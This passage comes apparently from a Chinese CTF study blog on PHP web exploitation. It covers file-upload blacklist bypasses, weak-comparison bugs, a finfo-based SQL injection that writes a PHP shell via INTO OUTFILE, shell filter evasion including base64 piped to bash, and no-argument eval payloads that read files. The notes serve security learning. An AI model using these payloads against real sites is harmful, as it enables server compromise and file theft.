过滤器**，最终过滤器链的内容为\n\n```\nphp://filter/dechunk|convert.iconv.UTF8.UCS-4|convert.iconv.UTF8.UCS-4|...|convert.iconv.UTF8.UCS-4/resource=/tmp/test\n```\n\n然后在`echo file_get_contents($filter);`中，会进行文件读取并应用该过滤器链，此时会出现两种结果\n\n- 如果第一个字符是在十六进制值的范围中，那么该内容通过dechunk的时候就会被丢弃，也就不会报错\n- 如果第一个字符不是在十六进制值的范围中，那么该过滤器链就会完整应用，并且触发memory_limit错误\n\n先学到这吧，实在是太难琢磨了那篇文章\n\n## pathinfo()函数绕过\n\n参考文章：[文件上传upload-labs 第20关 pathinfo()函数](https://blog.csdn.net/YYYYU_ZHIZZZ/article/details/134287200)\n\n这个通常出现在我们上传文件的时候的一种绕过，先来看看pathinfo()函数\n\n### pathinfo()函数\n\n![image-20250416190255404](../image/achieve/202411/PHP小妙招/image-20250416190255404.png)\n\n![image-20250416190432393](../image/achieve/202411/PHP小妙招/image-20250416190432393.png)\n\npathinfo函数用于获取文件或目录的路径信息。它接受一个文件或目录的路径作为输入，并返回一个关联数组，其中包含有关路径的信息，例如 **`PATHINFO_DIRNAME`**、 **`PATHINFO_BASENAME`**、 **`PATHINFO_EXTENSION`**、 **`PATHINFO_FILENAME`**。\n\n![image-20250416190513189](../image/achieve/202411/PHP小妙招/image-20250416190513189.png)\n\n需要注意一个很重要的点：\n\n PATHINFO_EXTENSION常量表示识别任何有效的拓展名，**如果拓展名有斜杠 / 或者 \\ 就忽略，返回文件名最后一个点号后面的字符串作为拓展名。如果遇到最后一个点号后面没有拓展名或者拓展名无效就返回为空**。\n\n```\n $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);\n```\n\n根据这个特性，我们就可以在一些题目里进行绕过\n\n如果有一个黑名单后缀验证，很显然要使用特殊的符号和可执行的拓展名拼接，但是这个符号不会影响拼接的拓展名服务器识别是脚本文件。\n\n​    如果使用 `1.php. `的文件名上传上去，最后一个点后面没有正确的后缀名了，pathinfo函数就会返回一个空字符给变量 $file_ext，再拿这个空字符去匹配黑名单显然这个文件就不会被阻止。\n\n- 基于windows特性，同样的使用 1.php. .  1.php空格  1.php.空格    1.php::$DATA等格式都可以，可以绕过黑名单，也能让文件最终保存为 1.php 。这个在之前文件上传的知识点里有介绍过\n\n\n- ​    如果是linux部署的话，例如00截断抓包改成 1.php%00.jpg （%00要解码，但是要求PHP版本低于5.3.4）。\n\n\n- ​    如果PHP版本过高那`%00`截断就无效了，只能用一个之前从未使用的方法，在两个系统环境使用有一点点区别。在windows下部署可以抓包保存文件名使用`1.php/.`    `1.php\\. ` ` 1.php/\\.`等，在linux下部署就只能用`1.php/. `这个了。原因很简单，文件命名的时候` / \\ `在windows是禁止的而 `/ `在linux也是禁止的，所以不会出现在文件名中最终保存还是1.php文件名。但是` \\ `在linux是一个转义符号允许出现在文件名中，出现在后缀(1.php\\.)那就没什么意义了。\n\n- **关于为什么 / 后面要一个点，是因为pathinfo函数返回后缀名（最后一个点号后面的字符串）的时候会去除 / 和 \\ 。如果使用1.php/的话，那么去除 / 后返回的真实的php后缀被读取到就会黑名单匹配上。加上一个点pathinfo函数读取的就是最后的点后面的字符串，点后面是空字符串不是有效拓展名它就返回为空，空就不会匹配黑名单以达到绕过黑名单目的。**\n\n  ​    再拓展一下` \\.` 在linux的作用。如果linux下有一个文件`1.php\\.`的文件，使用`php  1.php\\.`命令去执行，那么会认为文件名是 `1.php.` 就会找不到这个文件。正确做法是`php '1.php\\.'`告诉系统 \\ 是文件名一部分而不是转义符号。\n\n所以在Linux下我们就可以利用`\\.`去绕过后缀名的检测，接下来我们再学习一个新的姿势点\n\n## move_uploaded_file的一个细节\n\n参考文章：[从0CTF一道题看move_uploaded_file的一个细节问题](https://www.anquanke.com/post/id/103784)\n\n这个细节的话也是在做TGCTF的时候碰到的，先是用pathinfo()函数结合黑名单对后缀名进行了过滤，再去进行move_uploaded_file操作，对于这一步的绕过，一开始很多人都构造成了 name=index.php/. 这种格式，但是会发现，这样虽然绕过了后缀检查，\n其中，假如我们传入的是 name=`aaa.php/. `，则能够正常生成 aaa.php，而传入`ndex.php/.`则在覆盖文件这一步失败了\n\n在文章的两个测试中，可以发现name=index.php/. 的错误信息是No Such file or Directory，而name=aaa/../index.php/. 则没有报错，因此初步猜测是move_uploaded_file对于经过了目录跳转后的文件判断机制发生了变化，这里需要结合函数源码进行分析，详细的在这位师傅的文章中写的很好\n\n结论：**在进行了目录跳转后，move_uploaded_file将文件判断为不存在了，因此能够执行覆盖操作。**\n\n题目:TGCTF2025--**(ez)upload**（很经典的题目）\n\n## in_array() 函数弱比较漏洞\n\n- 这是 PHP 的一个内置函数，用于检查指定的值是否存在于数组中。\n\n- 语法是\n\n  ```php\n  in_array(mixed $needle, array $haystack, bool $strict = false)\n  ```\n\n  - **`$needle`**: 要搜索的值（在这个例子中是 `$_GET['n']`）。\n  - **`$haystack`**: 要搜索的数组（在这个例子中是 `$allow`）。\n  - **`$strict`**（可选）：如果为 `true`，则在比较时会进行强类型检查。\n\n注:in_array()函数默认没设置为true采用的是弱比较，在进行检查比较的时候会自动进行类型转换，我们来验证一下\n\n```php\n<?php\n$a='1.php';\n$b=array(1,2,3,4,5);\nif(in_array($a,$b)){\n    echo \"yes\";\n}\n\n #输出结果是yes，证明1和1.php是相等的，即通过了弱比较  \n```\n\n**in_array() 函数存在弱比较的漏洞，如果没有设置第三个参数，in_array()  函数在比较时默认是弱类型比较，这意味着它会进行自动类型转换。例如数组中的元素是整数，而搜索的值是字符串，PHP  会尝试将字符串转换为整数来进行比较。比如上面字符串类型的 1.php 就自动转换为了整数 1，也就符合在数组中的条件。**\n\n## strcmp()函数漏洞\n\n`strcmp()` 是一个 PHP 函数，用于比较两个字符串。它的用法如下：\n\n```\nint strcmp ( string $str1 , string $str2 )\n```\n\n- 如果 `str1` 小于 `str2`，那么 `strcmp()` 返回一个小于 0 的整数。\n- 如果 `str1` 大于 `str2`，那么 `strcmp()` 返回一个大于 0 的整数。\n- 如果 `str1` 等于 `str2`，那么 `strcmp()` 返回 0。\n\nstrcmp函数无法比较数组,对象，会返回0\n\n## 关于PHP优先级的规则\n\n其实是起源于我做到的一个签到题，题目代码如下\n\n```php\neval(\"var_dump((Object)$_POST[1]);\");\n```\n\n这里的话用强制类型转化对我们的参数进行了转换，但是我在测试的时候传入phpinfo()是可以执行phpinfo的，这是为什么呢？\n\n我们先看看运算符优先级\n\n![image-20250430204203212](../image/achieve/202411/PHP小妙招/image-20250430204203212.png)\n\n但是在函数调用结合运算符的时候也是有优先级的，\n\n函数调用和以下运算符的优先级相同：\n\n- `()`：用于强制改变优先级或调用函数。\n- `[]`：数组访问。\n- `->`：对象成员访问。\n- `::`：类静态成员访问。\n\n并且这些运算符的优先级大于其他运算符，例如我们举个例子\n\n```php\n<?php\nvar_dump((Object)phpinfo());\n```\n\n这里按照我们刚刚的说法，这里会先执行函数调用，再进行类型转化，因为phpinfo()函数的返回值是true，那么此时(Object)只是会对phpinfo()的返回值进行转化而不会影响phpinfo本身的执行，不过这道题最终还是通过闭合括号去进行的RCE\n\n## finfo文件注入\n\n这是我在复盘web224的时候重新认识到的一个知识点，假设源码是这样的\n\n```php\n<?php\nerror_reporting(0);\n\nif ($_FILES[\"file\"][\"error\"] > 0) {\n    die(\"Return Code: \" . $_FILES[\"file\"][\"error\"] . \"<br />\");\n}\n\nif ($_FILES[\"file\"][\"size\"] > 10 * 1024) {\n    die(\"文件过大: \" . ($_FILES[\"file\"][\"size\"] / 1024) . \" Kb<br />\");\n}\n\nif (file_exists(\"upload/\" . $_FILES[\"file\"][\"name\"])) {\n    echo $_FILES[\"file\"][\"name\"] . \" already exists. \";\n} else {\n    $filename = md5(md5(rand(1, 10000))) . \".zip\";\n    $filetype = (new finfo)->file($_FILES['file']['tmp_name']);\n    \n    if (preg_match(\"/image|png|bmap|jpg|jpeg|application|text|audio|video/i\", $filetype)) {\n        die(\"file type error\");\n    }\n    \n    $filepath = \"upload/\" . $filename;\n    $sql = \"INSERT INTO file(filename,filepath,filetype) VALUES ('\" . $filename . \"','\" . $filepath . \"','\" . $filetype . \"');\";\n    \n    move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], \"upload/\" . $filename);\n    \n    $con = mysqli_connect(\"localhost\", \"root\", \"root\", \"ctf\");\n    if (!$con) {\n        die('Could not connect: ' . mysqli_error());\n    }\n    \n    if (mysqli_multi_query($con, $sql)) {\n        header(\"location:filelist.php\");\n    } else {\n        echo \"Error: \" . $sql . \"<br>\" . mysqli_error($con);\n    }\n    \n    mysqli_close($con);\n}\n?>\n```\n\n此时这里的$filepath和$filename都是不可控的，我们该如何进行sql注入呢\n\n我们看sql语句\n\n```\n$sql = \"INSERT INTO file(filename,filepath,filetype) VALUES ('\" . $filename . \"','\" . $filepath . \"','\" . $filetype . \"');\";\n```\n\n这里可控的只有$filetype了，关于$filetype\n\n```php\n$filetype = (new finfo)->file($_FILES['file']['tmp_name']);\n```\n\n这里实例化了finfo对象并调用了file函数，但是这个file函数会返回文件的一些信息，然后我们的payload是这样的\n\n上传一个txt文件，内容为\n\n```php\nC64File \"');select 0x3c3f3d60746163202f662a603f3e into outfile '/var/www/html/2.php';--+\n```\n\n可以看到后面是有闭合并进行sql注入的sql语句，但是这里能否写入呢？\n\n本地测试一下\n\n假设这里有代码\n\n```php\n<?php\n$filetype = (new finfo)->file('1.txt');\nvar_dump($filetype);\n```\n\n然后当前目录下创建一个txt\n\n```\nC64File \"');select 0x3c3f3d60746163202f666c2a603f3e into outfile '/var/www/html/file1.php';--+\n```\n\n然后我们输出一下\n\n![image-20250507202521426](../image/achieve/202411/PHP小妙招/image-20250507202521426.png)\n\n可以看到这里的sql语句是插进去的了，证明这里可以通过C64File去插入我们的恶意代码让finfo检测的时候将恶意代码一同赋值给filetype\n\n","tags":["php小技巧"],"categories":["知识点积累"]},{"title":"对于RCE和文件包含的一点总结","url":"/3025/04/16/对于RCE和文件包含的一点总结/","content":"\n# 什么是RCE\n\nRCE漏洞，即远程代码漏洞和远程命令执行漏洞，这种漏洞允许攻击者在后台服务器上远程注入操作系统命令或代码，从而控制后台系统。\n\n在很多Web应用中，**开发人员**会使用一些**特殊函数**，这些函数以一些字符串作为输入，功能是将输入的字符串当作**代码**或者**命令**来进行执行。当**用户**可以控制这些函数的输入时（当应用程序未正确**验证**、**过滤**或**限制**用户输入时），就产生了RCE漏洞。\n\n# **分类(远程代码和远程命令)**\n\n1.命令执行漏洞：直接调用操作系统命令。例如，当Web应用在调用一些能将字符串转化成代码的函数时，如果未对用户输入进行合适的处理，可能造成命令执行漏洞。\n\n2.代码执行漏洞：靠执行脚本代码调用操作系统命令。例如，PHP中的system()、exec()和passthru()函数，如果未对用户输入进行过滤或过滤不严，可能导致代码执行漏洞。\n\n额外的:\n\n3.系统的漏洞造成命令注入：例如bash破壳漏洞（CVE-2014-6271）是一个远程命令执行（RCE）漏洞。这个漏洞存在于Bash shell中，使得攻击者可以通过构造特定的环境变量值来执行任意命令，从而获取系统的控制权。。\n\n4.调用的第三方组件存在代码执行漏洞：例如WordPress中用来处理图片的ImageMagick组件，以及JAVA中的命令执行漏洞（如struts2、ElasticsearchGroovy等）。\n\n# RCE漏洞产生的条件\n\n1. 存在可调用执行命令的函数\n2. 函数参数可控\n3. 应用程序未正确**验证**、**过滤**或**限制**用户输入\n\n# RCE绕过bypass姿势\n\n先说说一些命令函数\n\n## **php执行系统命令函数**\n\n- system : 执行外部程序，并且显示输出，如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。如果要获取一个命令未经任何处理的 原始输出， 请使用 passthru() 函数。\n- exec ： 执行一个外部程序,回显最后一行,需要用echo输出。\n- shell_exec ： 通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。\n- popen ： 打开一个指向进程的管道，该进程由派生给定的 command 命令执行而产生。\n- proc_open ： 执行一个命令，并且打开用来输入/输出的文件指针。\n- passthru ： 执行外部程序并且显示原始输出。同 exec() 函数类似， passthru() 函数 也是用来执行外部命令（command）的。 当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数。 常用来执行诸如 pbmplus 之类的可以直接输出图像流的命令。 通过设置 Content-type 为 image/gif， 然后调用 pbmplus 程序输出 gif 文件， 就可以从 PHP 脚本中直接输出图像到浏览器。\n- pcntl_exec() ： 在当前进程空间执行指定程序，当发生错误时返回 false ，没有错误时没有返回。\n- `（反引号）：同 shell_exec()\n\n## 绕过关键字黑名单\n\n绕过文件名\n\n- 通配符绕过\n\n| *      | 匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） |\n| ------ | ------------------------------------------------------------ |\n| ?      | 匹配任何一个字符（不在括号内时）?代表任意1个字符             |\n| [abcd] | 匹配指定字符范围内的任意单个字符                             |\n| [a-z]  | 表示范围a到z，表示范围的意思                                 |\n\n配符是由shell处理的, 它只会出现在 命令的“参数”里。当shell在“参数”中遇到了通配符时，shell会将其当作路径或文件名去在磁盘上搜寻可能的匹配：若符合要求的匹配存在，则进行代换(路径扩展)；否则就将该通配符作为一个普通字符传递给“命令”，然后再由命令进行处理。总之，通配符实际上就是一种shell实现的路径扩展功能。在 通配符被处理后, shell会先完成该命令的重组，然后再继续处理重组后的命令，直至执行该命令。\n\n例如我们的flag.php文件，我们可以用fla*或者fla?????去进行模糊匹配，但是这里需要注意，如果目录中有flax这种类似也可以匹配上的文件，系统可能会无法正确做出匹配或者返回多个可以匹配上的文件，例如我们设置一个1.txt\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1????\n123\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1*\n123\n```\n\n如果我们加上一个1.php文件\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# vim 1.php\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1*\n1\n123\n```\n\n- 单引号双引号反引号绕过\n\n对php来说这是fl\"\"ag而不是flag关键字不会匹配上，但是对于linux系统来说cat /fl\"\"ag等效于cat /flag。外面包裹的是单引号里面就是双引号，外面包裹的是双引号里面就是单引号，或者用斜线\\进行转义，避免报错\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca''t 1.txt \n123\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca\"\"t 1.txt \n123\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# ca``t 1.txt \n123\n```\n\n- 反斜杠绕过\n\nlinux看到反斜线\\会自动帮你去掉,正常执行命令\n\n例如`ca\\t 1.php`\n\n- $1到$9、$@和$*绕过\n\n由于这些变量输出都为空，因此可以作为空格绕过\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$1.php\n1\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$9.php\n1\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$@.php\n1\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat 1$*.php\n1 \n```\n\n- 变量拼接绕过\n\n```\na=c;b=a;c=t;$a$b$c //拼接\n例如\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# a=c;b=a;c=t;\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# $a$b$c 1.php\n1\n```\n\n- 利用base编码绕过\n\n```\necho '(base64编码)' | base64 -d | bash\n这里利用了管道符去逐个执行我们的命令，先base64编码输出，然后通过|管道符把上一个的输出作为下一个的输入，也就是base64 -d的输入，其中-d代表着解码，之后再把解码的内容传给bash，解码后的内容会被当成bash命令去执行\n例如\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# echo 'Y2F0IDEucGhw' | base64 -d | bash\n1\n其中Y2F0IDEucGhw解码后是cat 1.php\n当然这里也不一定需要bash，也可以直接用反引号内联执行\n`echo 'Y2F0IDEucGhw' | base64 -d`\n```\n\n- 利用hex编码绕过\n\n在Linux中，可以使用`xxd`命令对十六进制（hex）进行解码。\n\n```\necho '(hex编码)' | xxd -r -p | bash\n例如\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# echo '63 61 74 20 31 2e 70 68 70' | xxd -r -p | bash\n1\n其中63 61 74 20 31 2e 70 68 70就是cat 1.php的hex编码\n```\n\n## 特殊命令替换绕过\n\n### 读文件命令cat\n\nmore：\n\n- 用于分页查看文件内容。\n- 支持通过空格键向下翻页，b键向上翻页，q键退出查看。\n- 还可以搜索指定文本，并支持设置每屏显示的行数。\n\nless：\n\n- 类似于more，但功能更强大。\n- 支持方向键上下滚动，空格向下翻页，b向上翻页。\n- 可以显示行号，支持搜索指定字符串，并可以方便地查找和浏览文件内容。\n- 使用q键退出查看。\n\nhead：\n\n- 用于查看文件的开头部分。\n- 默认显示文件的前10行，但可以通过指定参数来显示更多或更少的行数或字节数。\n- 支持与其他命令结合使用，如管道命令。\n\nsort：\n\n- 用于对文本文件内容进行排序。\n- 支持多种排序方式，如按字母、数字、逆序排序等。\n- 还可以合并已排序的文件，删除重复行，以及检查文件是否已经排序。\n\ntail：\n\n- 用于显示文件的末尾内容。\n- 默认显示文件的最后10行，但可以通过指定参数来显示更多行数。\n- 支持实时追踪文件的变化，并持续显示新增的内容，适用于查看日志文件等动态更新的文件。\n\ntac:\n\n- 从最后一行开始显示，可以看成 tac 是 cat 的反向显示\n\n## 空格的绕过\n\n- 大括号\n\n```\n{cat,flag.php}\n在大括号中逗号会被看成是分隔符\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# {cat,1.php}\n1\n```\n\n- 环境变量$IFS\n\n在Linux中有一个环境变量叫IFS，为内部字段分隔符\n\n```\n$IFS$9 (1-9)\n${IFS}\n```\n\n这里的`{}`是为了固定变量名，如果直接用$IFS的话可能会导致后面的内容一部分被当成环境变量名进行解析\n\n$IFS$9后面加个$与{}类似，起截断作用，$9是当前系统shell进程第九个参数持有者始终为空字符串。\n\n```\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat${IFS}1.php\n1\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$IFS1.php\ncat.php: command not found\nroot@dkhkv28T7ijUp1amAVjh:/www/wwwroot/156.238.233.87# cat$IFS$11.php\n1\n```\n\n这里就可以看到我们第二种是错误的\n\n- 重定向字符<，<>\n\n重定向符号在Linux或Unix系统中用于控制命令的输入和输出。它可以将命令的输出发送到文件或从文件中获取输入。\n\n**`<`**：从文件中获取输入，将文件内容作为命令的标准输入。\n\n**`>`**：将命令的标准输出重定向到文件，如果文件不存在则创建，如果文件已存在则覆盖其内容。\n\n- 编码字符绕过（在linux下不可行，需要在php环境下）\n\n用%09，%20等可以表示成空的编码字符进行绕过\n\n# RCE命令执行的姿势\n\n## 写入一句话木马\n\n对于`eval($a)`因为在eval函数中的语句都会被当成php代码去执行\n\n所以我们传入`$a=eval($_GET[1]);&1=phpinfo();`会发现可以成功执行phpinfo\n\n## 短标签\n\n`<?= ?>` 是 PHP 中的一种短标签，用于快速输出变量或表达式的值。这种标签是 `<?php echo ?>` 的简写形式。\n\n利用短标签可以绕过对php的检查\n\n## 内联执行\n\n在 PHP 中，反引号（``）主要用于执行系统命令。使用反引号包围命令时，PHP 将会在操作系统上执行该命令，并返回命令的输出结果。\n\n```\n例如\n`tac fla*`就是执行tac fla*的命令，然后将命令的结果返回\n```\n\n## 关于eval中有echo的限制\n\n这个思路起源于web41，源代码是这样的\n\n```php\neval(\"echo($c);\");\n```\n\n这时候我们如果直接传入php代码的话会发现他会全部输出而不是执行代码，并且这里是放入这个`$c`变量而不是直接拼接，导致了我无法使用闭合去绕过echo，此时我就想到了一个关于函数调用符号`()`的一个优先级问题\n\n```php\n<?php\necho (system)('whoami'); \n```\n\n此时会发现居然执行了whoami命令，这是因为函数调用操作符会将字符串 `\"system\"` 转换为可调用的函数，例如我们用phpinfo也是一样的\n\n```php\n<?php\necho (phpinfo)();\n```\n\n所以这个思路也是一个可以绕过echo的思路\n\n## eval中无参数RCE\n\n假如我们有下面这段代码\n\n```php\n<?php \nhighlight_file(__FILE__);\nif(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) {    \n    eval($_GET['code']);\n}\n```\n\n正则表达式 `[^\\W]+\\((?R)?\\)` 匹配了一个或多个非标点符号字符（表示函数名），后跟一个括号（表示函数调用）。简而言之，无参数rce就是不使用参数，而只使用一个个函数最终达到目的。\n\n这种情况下我们传入的函数只能是没有参数的函数例如phpinfo()这类的\n\n什么是无参数呢？\n\n顾名思义就是无参数的函数，只使用函数且函数不能带有参数，这里的最大限制在于我们选择的函数必须参数为空或者只有一个参数，此时内层函数的返回值就可以作为外层函数的参数进行递归套用\n\nphp常用内置无参函数：\n\n```\nget_defined_vars() -  返回由所有已定义变量所组成的数组\nphpinfo() -显示php详细内容\n```\n\n### 查看当前目录文件名\n\n最常见的就是\n\n```\nprint_r(scandir(getcwd()))\ngetchwd() 函数返回当前工作目录。不需要参数\nscandir() – 将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）需要参数\n```\n\n#### 方法一：localeconv()函数\n\n怎么构造参数里的小数点呢？\n\n```\nlocaleconv()函数：返回一个包含本地数字及货币格式信息的数组 第一个是.\n```\n\n怎么获取到第一个数组的值(.)呢？\n\n- 最终的payload\n\n```\n1.print_r(scandir(current(localeconv())));\n2.print_r(scandir(pos(localeconv())));\n3.print_r(scandir(reset(localeconv())));\n```\n\ncurrent()函数：读取数组的第一个元素\n\nprint_r可以用var_dump代替,current可以用pos和reset代替\n\npos — current() 的别名\n\nreset()该函数返回数组第一个单元的值，如果数组为空则返回 FALSE\n\n我们举个例子\n\n如果我们想要返回当前目录下的所有文件和目录，就需要用到scandir()函数，但是这个函数需要一个参数`$directory`去指定要扫描的目录路径。所以我们需要`scandir('.')` 函数调用会扫描当前目录，那么我们怎么去构造这个小数点呢？这里就需要用到能返回小数点的函数localeconv()，localeconv()的数组的第一个就是小数点，然后我们通过current()函数去读取数组的第一个元素，这样就能构造一个小数点，结合这些我们的payload构造就是\n\n```\nscandir(current(localeconv()))\n```\n\n然后使用一个输出函数去将结果输出\n\n```\nvar_dump(scandir(current(localeconv())))\n```\n\n实操一下\n\n先看一下localeconv下的数组内容\n\n```\n?a=var_dump(localeconv());\n```\n\n![image-20250307112128383](../image/achieve/202411/RCE的bypass/image-20250307112128383.png)\n\n可以看到第一个确实是小数点，我们试着返回这个小数点\n\n```\n?a=var_dump(current(localeconv()));\n```\n\n![image-20250307112322248](../image/achieve/202411/RCE的bypass/image-20250307112322248.png)\n\n能返回小数点，那就试着读取一下当前目录\n\n```\n?a=var_dump(scandir(current(localeconv())))\n```\n\n![image-20250307112802088](../image/achieve/202411/RCE的bypass/image-20250307112802088.png)\n\n\n\n能正常返回，但是这里为什么第一个和第二个是小数点呢？因为在文件系统中，`.` 代表当前目录，`..` 代表父目录。使用 `scandir()` 函数扫描目录时，会自动包含这两个目录项\n\n#### 方法二：chr(46)\n\n```\nchr(46)`就是字符`\".\"\n怎么构造46呢？\nrand()函数：返回一个随机数\n1.chr(rand())//不实际，得看运气\n2.chr(time())\nchr()函数以256为一个周期，所以chr(46),chr(302),chr(558)都等于\".\"。所以使用chr(time())，一个周期必定出现一次\".\"\n```\n\n#### 方法三：phpversion()函数\n\n参考文章：[无参数读文件和RCE总结](https://zhuanlan.zhihu.com/p/157431794)\n\n```\n这个方法比较撇，所以如果其他方法行不通再用这个方法\nphpversion()`返回PHP版本，如`5.5.9\nfloor(phpversion())返回 5\n\nsqrt(floor(phpversion()))返回2.2360679774998\n\ntan(floor(sqrt(floor(phpversion()))))返回-2.1850398632615\n\ncosh(tan(floor(sqrt(floor(phpversion())))))返回4.5017381103491\n\nsinh(cosh(tan(floor(sqrt(floor(phpversion()))))))返回45.081318677156\n\nceil(sinh(cosh(tan(floor(sqrt(floor(phpversion())))))))返回46\nchr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))返回\".\"\n```\n\n#### 方法四：crypt()函数\n\n`hebrevc(crypt(arg))`可以随机生成一个hash值，第一个字符随机是`$`(大概率) 或者 `\".\"`(小概率) 然后通过`chr(ord())`只取第一个字符，ord()函数可以返回字符的ASCII值\n\n所以最后的payload就是\n\n```\nprint_r(scandir(chr(ord(hebrevc(crypt(time()))))));//还是概率事件，多尝试几次\n```\n\n### 读取当前目录文件 \n\n我们前面成功的返回了目录下的文件名，但是文件是不会直接显示的，所以我们还想需要使用函数去读取文件\n\n前面的方法输出的是数组，文件名是数组的值，那我们要怎么取出想要读取文件的数组呢\n\n#### 操作数组的函数\n\n```\nend() ： 将内部指针指向数组中的最后一个元素，并输出\nnext() ：将内部指针指向数组中的下一个元素，并输出\nprev() ：将内部指针指向数组中的上一个元素，并输出\nreset() ： 将内部指针指向数组中的第一个元素，并输出\neach() ： 返回当前元素的键名和键值，并将内部指针向前移动\npos() ： 返回数组中的当前单元, 默认取第一个值\ncurrent() ：读取数组的第一个元素\narray_rand() 函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。\narray_flip()函数用于反转/交换数组中所有的键名以及它们关联的键值。\narray_slice() 函数在数组中根据条件取出一段值，并返回。\narray_reverse() 函数返回翻转顺序的数组。\n```\n\n#### 读取文件的函数\n\n```\nfile_get_contents()[需要查看源代码],highlight_file()、show_source()、readfile()[需要查看源代码]：读取文件内容\nreadgzfile()也可读文件，常用于绕过过滤\n```\n\n例如在一道题目中有index.php\n\n![image-20250416113012028](../image/achieve/202411/RCE的bypass/image-20250416113012028.png)\n\n是数组的最后一个元素，我们用end()函数，最终的payload就是\n\n#### end()函数读取最后一个文件\n\n```\nhighlight_file(end(scandir(current(localeconv()))));\nshow_source(end(scandir(current(localeconv()))));\nreadfile(end(scandir(current(localeconv()))));\n等都可以\n```\n\n或者我们也可以用array_reverse()函数翻转数组\n\n#### array_reverse()函数翻转数组\n\n```\nhighlight_file(current(array_reverse(scandir(current(localeconv())))));\n```\n\n如果是第二个我们可以用next移动指针指向第二个\n\n#### next()函数移动指针\n\n```\nshow_source(next(array_reverse(scandir(getcwd()))));\n```\n\n如果不是数组的第一第二个呢？\n\n### 读取非第一第二文件\n\n我们可以使用`array_rand(array_flip())`，`array_flip()`是交换数组的键和值，`array_rand()`函数返回数组中的随机键名\n\n```\nvar_dump(array_rand(array_flip(scandir(current(localeconv())))));//返回文件名\nhighlight_file(array_rand(array_flip(scandir(current(localeconv())))));//读取文件\n```\n\n（这些读取文件的payload都可以自己结合前面总结的构造`\".\"`的方法切合实际过滤情况读取)\n\n### 查看上级目录文件名\n\n#### 方法一：dirname()函数\n\n- dirname() 函数返回路径中的目录部分。需要参数\n\n例如\n\n```php\n<?php\nprint_r(dirname('/var/www/1.php'));\n#\n/var/www\n```\n\n如果传入的值是绝对路径（不包含文件名），则返回的是上一层路径，传入的是文件名绝对路径则返回文件的当前路径\n\n例如我们题目中\n\n```php\nprint_r(dirname(getcwd()));\n/var/www\n```\n\n所以我们如果希望读取上级目录的话\n\n```\nprint_r(scandir(dirname(getcwd())));\n```\n\n#### 方法二：构造`..`\n\n其实我们在了解scandir函数的时候就知道，`scandir()` 函数扫描目录时，会自动包含`.`和`..`这两个目录项，`.` 代表当前目录，`..` 代表父目录，所以我们返回的数组的第二个就是`..`，那么我们可以使用next()函数操作指针去获取`..`\n\n```\nprint_r(next(scandir(getcwd())));//返回..\n```\n\n然后我们再用scandir去获取目录\n\n```\nprint_r(scandir(next(scandir(getcwd())));//查看上级目录\n```\n\n### 读取上级目录文件\n\n其实是和之前讲的读取目录文件是一样的，只不过我们需要改变当前工作目录为上级目录而已，所以payload有\n\n```\nshow_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));\nshow_source(array_rand(array_flip(scandir(next(scandir(getcwd()))))));\n```\n\n但是这里切换路径后`getcwd()`和`localeconv()`不能接收参数，因为语法不允许，我们可以用之前的`hebrevc(crypt(arg))`\n\n这里`crypt()`和`time()`可以接收参数，于是构造\n\n```\nshow_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));\n或更复杂的：\nshow_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));\n还可以用：\nshow_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位\n```\n\n### 查看和读取根目录文件\n\n```\nprint_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));\n```\n\n`strrev(crypt(serialize(array())))`所获得的字符串第一位有几率是`/`\n\n```php\n<?php\nprint_r(chr(ord(strrev(crypt(serialize(array()))))));\n/\n```\n\n所以使用以上payload可以查看根目录文件\n\n![image-20250416115831819](../image/achieve/202411/RCE的bypass/image-20250416115831819.png)\n\n但是有权限限制，linux系统下需要一定的权限才能读到，所以不一定成功\n\n读根目录文件：(也是需要权限)\n\n和前面的一样，但是同样的对于权限有限制，这个我前几天打TGCTF就碰到这种情况了\n\n```\nhighlight_file(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));\n```\n\n### glob伪协议查看文件\n\n`glob` 伪协议是 